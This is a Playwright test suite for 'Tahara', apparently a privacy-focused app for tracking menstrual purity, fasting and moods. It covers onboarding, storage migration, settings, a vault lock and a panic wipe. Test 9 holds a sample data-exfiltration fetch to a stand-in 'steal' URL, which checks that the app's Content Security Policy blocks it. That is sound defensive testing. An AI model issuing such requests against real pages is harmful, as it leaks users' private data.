// tests/tahara.spec.js
import {expect, test} from '@playwright/test';

test.describe('Tahara E2E UX Paths', () => {

    /**
     * Helper to read from Tahara IndexedDB
     */
    async function getIndexedDBData(page, storeName, key = 'data') {
        return await page.evaluate(async ({storeName, key}) => {
            return new Promise((resolve, reject) => {
                const request = indexedDB.open('tahara_db');
                request.onsuccess = (event) => {
                    const db = event.target.result;
                    try {
                        const transaction = db.transaction(storeName, 'readonly');
                        const store = transaction.objectStore(storeName);
                        const getReq = store.get(key);
                        getReq.onsuccess = () => resolve(getReq.result);
                        getReq.onerror = () => reject(getReq.error);
                    } catch (e) {
                        reject(e);
                    }
                };
                request.onerror = (event) => reject(event.target.error);
            });
        }, {storeName, key});
    }

    test('1. Onboarding Flow is visible and can be completed', async ({page}) => {
        // Clear storage to ensure it's treated as a first-time user
        await page.goto('/');
        await page.evaluate(async () => {
            localStorage.clear();
            // Also clear IndexedDB if it exists
            const dbs = await window.indexedDB.databases();
            dbs.forEach(db => window.indexedDB.deleteDatabase(db.name));
        });
        await page.reload();

        // Verify Onboarding Modal is visible
        const modal = page.locator('#onboardingModal');
        await expect(modal).toBeVisible();

        // Click "Next" twice, then "Get Started"
        const nextBtn = page.locator('#onbNextBtn');
        await nextBtn.click(); // Step 1 -> 2
        await nextBtn.click(); // Step 2 -> 3
        await nextBtn.click(); // Step 3 -> Finish

        // Verify modal is hidden and local storage is updated
        await expect(modal).toBeHidden();
        const isOnboarded = await page.evaluate(() => localStorage.getItem('tahara_onboarded'));
        expect(isOnboarded).toBe('true');
    });

    test('2. Core Loop: Mark Flow, Check Status, and Undo via Modal', async ({page}) => {
        // Bypass onboarding for this test
        await page.addInitScript(() => {
            localStorage.setItem('tahara_onboarded', 'true');
        });
        await page.goto('/');

        // Ensure we start in Purity
        const mainBtn = page.locator('#mainActionBtn');
        const statusText = page.locator('#current-state-text');
        
        // Wait for app to initialize from IndexedDB
        await expect(statusText).toHaveText('Purity');

        // 1. Mark Flow Started
        await mainBtn.click();
        await expect(statusText).toHaveText('Hayd');
        await expect(mainBtn).toHaveText('Mark Purity Achieved');

        // Verify toast appeared
        await expect(page.locator('#toast-container')).toContainText('Status updated successfully');

        // 2. Undo the action (Triggers Confirmation Modal)
        await page.locator('#undoBtn').click();

        // 3. Confirm the deletion in the modal
        const confirmBtn = page.locator('.modal-confirm-btn');
        await expect(confirmBtn).toBeVisible();
        await confirmBtn.click();

        // Verify we are back to Purity
        await expect(statusText).toHaveText('Purity');

        // Verify IndexedDB state
        const statusData = await getIndexedDBData(page, 'status');
        expect(statusData.status).toBe('purity');
    });

    test('3. Fasting Ledger: Add and Remove Missed/Paid Days', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        // Navigate to Fasting Tab
        await page.locator('button[data-tab="fasting"]').click();
        await expect(page.locator('#view-fasting')).toBeVisible();

        // Add 2 missed fasts
        const addMissedBtn = page.locator('button[data-i18n-aria="aria_add_missed"]');
        await addMissedBtn.click();
        await addMissedBtn.click();

        // Verify Missed = 2, Debt = 2
        await expect(page.locator('#totalMissed')).toHaveText('2');
        await expect(page.locator('#debtDisplay')).toHaveText('2');

        // Add 1 Paid fast
        const addPaidBtn = page.locator('button[data-i18n-aria="aria_add_paid"]');
        await addPaidBtn.click();

        // Verify Paid = 1, Debt = 1
        await expect(page.locator('#totalPaid')).toHaveText('1');
        await expect(page.locator('#debtDisplay')).toHaveText('1');

        // Verify IndexedDB state
        const fastingData = await getIndexedDBData(page, 'fasting');
        expect(fastingData.missed).toBe(2);
        expect(fastingData.paid).toBe(1);
    });

    test('4. Settings: Dark Mode Toggle modifies the DOM', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        const themeToggle = page.locator('#themeToggle');
        const body = page.locator('body');

        const classList = await body.getAttribute('class');
        expect(classList.split(' ')).not.toContain('dark');

        // Toggle Dark Mode
        await themeToggle.click();

        // Now we check if the class list DOES contain "dark"
        const updatedClassList = await body.getAttribute('class');
        expect(updatedClassList.split(' ')).toContain('dark');
        const isDark = await page.evaluate(() => localStorage.getItem('tahara_darkMode'));
        expect(isDark).toBe('true');
    });

    test('5. Settings: Language Switch updates layout to RTL and reloads', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        const langSelect = page.locator('#langSelect');

        // Select Arabic
        await langSelect.selectOption('ar');

        // The app triggers location.reload(), so we wait for the page to finish loading
        await page.waitForLoadState('networkidle');

        // Verify HTML dir is RTL and Lang is AR
        const htmlDir = await page.getAttribute('html', 'dir');
        const htmlLang = await page.getAttribute('html', 'lang');

        expect(htmlDir).toBe('rtl');
        expect(htmlLang).toBe('ar');

        // Verify text is translated (Home tab button)
        await expect(page.locator('button[data-tab="home"]')).toContainText('الرئيسية');
    });

    test('6. Calendar & Daily Logs: Select day and toggle mood', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        // Navigate to Calendar
        await page.locator('button[data-tab="calendar"]').click();
        await expect(page.locator('#view-calendar')).toBeVisible();

        // The Daily Log UI should be visible since today is selected by default
        await expect(page.locator('#dailyLogContainer')).toBeVisible();

        // Toggle a mood (e.g., Happy)
        const happyBtn = page.locator('#moodOptions button').first(); // Assumes 'Happy' is first
        await happyBtn.click();

        // Verify it got the active class (bg-rose-500)
        await expect(happyBtn).toHaveClass(/.*bg-rose-500.*/);

        // Verify it saved to IndexedDB
        const logs = await getIndexedDBData(page, 'logs');
        const hasHappyMood = Object.values(logs).some(dayTags => dayTags.includes('mood_happy'));
        expect(hasHappyMood).toBe(true);
    });

    test('7. Migration: Legacy LocalStorage data is moved to IndexedDB', async ({page}) => {
        // 1. Setup legacy data
        await page.goto('/');
        await page.evaluate(() => {
            localStorage.clear();
            localStorage.setItem('tahara_history', JSON.stringify([{status: 'hayd', time: new Date().toISOString()}]));
            localStorage.setItem('tahara_fasting', JSON.stringify({missed: 5, paid: 2}));
            localStorage.setItem('tahara_status', 'hayd');
            localStorage.setItem('tahara_last_changed', new Date().toISOString());
            localStorage.setItem('tahara_onboarded', 'true');
        });

        // 2. Reload page to trigger migration
        await page.reload();
        
        // Wait for migration and app init
        await expect(page.locator('#current-state-text')).toHaveText('Hayd');

        // 3. Verify LocalStorage is cleaned up
        const keys = await page.evaluate(() => Object.keys(localStorage));
        expect(keys).not.toContain('tahara_history');
        expect(keys).not.toContain('tahara_fasting');
        expect(keys).not.toContain('tahara_status');

        // 4. Verify data is in IndexedDB
        const fasting = await getIndexedDBData(page, 'fasting');
        expect(fasting.missed).toBe(5);
        expect(fasting.paid).toBe(2);

        const history = await getIndexedDBData(page, 'history');
        expect(history.length).toBe(1);
        expect(history[0].status).toBe('hayd');
    });

    test('8. Migration Edge Case: Corrupted LocalStorage data handles graceully', async ({page}) => {
        await page.goto('/');
        await page.evaluate(() => {
            localStorage.clear();
            localStorage.setItem('tahara_history', '{broken_json]');
            localStorage.setItem('tahara_status', 'hayd');
            localStorage.setItem('tahara_onboarded', 'true');
        });

        await page.reload();
        
        // App should still load (fallback to purity if history is broken)
        await expect(page.locator('#current-state-text')).toBeVisible();
        
        // localStorage should be cleared to prevent infinite migration loops
        const history = await page.evaluate(() => localStorage.getItem('tahara_history'));
        expect(history).toBeNull();
    });

    test('9. Security: Content Security Policy (CSP) blocks external fetch', async ({page}) => {
        await page.goto('/');
        
        // Attempt to fetch from an external URL
        const fetchError = await page.evaluate(async () => {
            try {
                await fetch('https://example.com/steal?data=test');
                return null;
            } catch (e) {
                return e.message;
            }
        });

        // CSP should cause a "Failed to fetch" error
        expect(fetchError).toContain('Failed to fetch');
    });

    test('10. UI Logic: Symptom vs. Mood Selection (Test Case 6)', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="calendar"]').click();

        const moodButtons = page.locator('#moodOptions button');
        const wellbeingButtons = page.locator('#wellbeingOptions button');

        // Mood: Radio behavior
        await moodButtons.nth(0).click(); // Happy
        await moodButtons.nth(1).click(); // Calm
        await expect(moodButtons.nth(0)).not.toHaveClass(/bg-rose-500/);
        await expect(moodButtons.nth(1)).toHaveClass(/bg-rose-500/);

        // Wellbeing: Checkbox behavior (Pain is index 3 in Wellbeing list)
        await wellbeingButtons.nth(3).click(); // Pain
        await wellbeingButtons.nth(4).click(); // Fatigue
        await expect(wellbeingButtons.nth(3)).toHaveClass(/bg-rose-500/);
        await expect(wellbeingButtons.nth(4)).toHaveClass(/bg-rose-500/);
    });

    test('11. UI Logic: Calendar Future Date Prevention (Test Case 7)', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="calendar"]').click();

        // Get initial selected date text
        const initialDateText = await page.locator('#selectedDateText').innerText();

        // Try to find a future date (opacity-40 class)
        const futureDate = page.locator('#calendarDays div.opacity-40').first();
        if (await futureDate.isVisible()) {
            await futureDate.click();
            const newDateText = await page.locator('#selectedDateText').innerText();
            expect(newDateText).toBe(initialDateText);
        }
    });

    test('12. UI Logic: Averages Empty State (Test Case 8)', async ({page}) => {
        await page.goto('/');
        await page.evaluate(() => {
            localStorage.clear();
            localStorage.setItem('tahara_onboarded', 'true');
        });
        // Set only 1 history entry (need 2 for averages)
        await page.evaluate(async () => {
            const request = indexedDB.open('tahara_db');
            request.onsuccess = (event) => {
                const db = event.target.result;
                const tx = db.transaction(['history', 'status'], 'readwrite');
                tx.objectStore('history').put([{status: 'hayd', time: new Date().toISOString()}]);
                tx.objectStore('status').put({status: 'hayd', lastChanged: new Date().toISOString()});
            };
        });
        await page.reload();
        await page.locator('button[data-tab="calendar"]').click();

        // Should NOT show NaN or 0d
        const avgCycle = page.locator('#avgCycleText');
        await expect(avgCycle).not.toContainText('NaN');
        await expect(avgCycle).not.toContainText('0d');
        // It should contain the empty state text (we'll check for its existence in strings.json later if needed, but for now we know it shouldn't be 0d)
        
        await expect(page.locator('#nextPeriodText')).toHaveText('--');
    });

    test('13. UI Logic: Settings Reminder Time Reveal (Test Case 9)', async ({page}) => {
        await page.addInitScript(() => {
            localStorage.setItem('tahara_onboarded', 'true');
            // Mock Notification API
            window.Notification = {
                permission: 'granted',
                requestPermission: async () => 'granted'
            };
        });
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        const toggleVisual = page.locator('#reminderToggle + div');
        const timeContainer = page.locator('#reminderTimeContainer');

        await expect(timeContainer).toBeHidden();
        await toggleVisual.click();
        await expect(timeContainer).toBeVisible();
        await toggleVisual.click();
        await expect(timeContainer).toBeHidden();
    });

    test('14. UI Logic: Diagnostic JSON Export (Test Case 10)', async ({page}) => {
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');
        await page.locator('button[data-tab="settings"]').click();

        // Intercept download
        const downloadPromise = page.waitForEvent('download');
        await page.locator('#settingsDiagnosticBtn').click();
        const download = await downloadPromise;

        expect(download.suggestedFilename()).toContain('tahara-diagnostics');
        
        // Verify toast
        await expect(page.locator('#toast-container')).toContainText('Diagnostic log saved');
    });

    test('15. Privacy Vault: Enable, Lock, and Unlock via OS Fallback', async ({page}) => {
        // Mock WebAuthn globally for this test
        await page.addInitScript(() => {
            if (navigator.credentials) {
                // Mock registration returning a fake rawId
                navigator.credentials.create = async () => ({
                    rawId: new Uint8Array([1, 2, 3, 4]).buffer
                });
                // Mock verification
                navigator.credentials.get = async () => ({});
            }
        });

        // Clear everything first
        await page.goto('/');
        await page.evaluate(async () => {
            localStorage.clear();
            const dbs = await window.indexedDB.databases();
            for (const db of dbs) {
                await window.indexedDB.deleteDatabase(db.name);
            }
        });
        await page.addInitScript(() => localStorage.setItem('tahara_onboarded', 'true'));
        await page.goto('/');

        // 1. Navigate to Settings and Toggle Vault
        await page.locator('button[data-tab="settings"]').click();
        const vaultToggle = page.locator('#vaultToggle + div');
        
        await vaultToggle.click();
        // Give time for toggle logic (encryption of existing data) to run
        await page.waitForTimeout(1000);
        
        // 2. Reload and Verify Lock Screen
        await page.reload();
        await page.waitForTimeout(1000); 

        await expect(page.locator('#vaultLockScreen')).toBeVisible();

        // 3. Unlock by clicking the Unlock button (triggers fallback in non-native)
        await page.locator('#vaultUnlockBtn').click();

        // Verify Lock Screen is hidden
        await expect(page.locator('#vaultLockScreen')).toBeHidden();
        await expect(page.locator('#current-state-text')).toContainText('Purity');
    });

    test('16. Privacy Vault: Panic Wipe from Lock Screen', async ({page}) => {
        // Setup locked state
        await page.goto('/');
        await page.evaluate(async () => {
            localStorage.clear();
            localStorage.setItem('tahara_onboarded', 'true');
            localStorage.setItem('tahara_vault_enabled', 'true');
            localStorage.setItem('tahara_master_key', btoa('fake-key-content'));
        });
        await page.reload();
        await page.waitForTimeout(1000);

        await expect(page.locator('#vaultLockScreen')).toBeVisible();

        // Mock confirmation for panic wipe
        await page.evaluate(() => {
            window.showConfirmModal = (t, m, b, cb) => cb();
        });

        // Trigger Panic Wipe
        await page.locator('#vaultPanicBtn').click();

        // Wait for lock screen to be hidden (means reload/redirect happened)
        await expect(page.locator('#vaultLockScreen')).toBeHidden({ timeout: 15000 });

        // Verify Storage Cleared
        const vaultEnabled = await page.evaluate(() => localStorage.getItem('tahara_vault_enabled'));
        expect(vaultEnabled).toBeNull();
    });
});
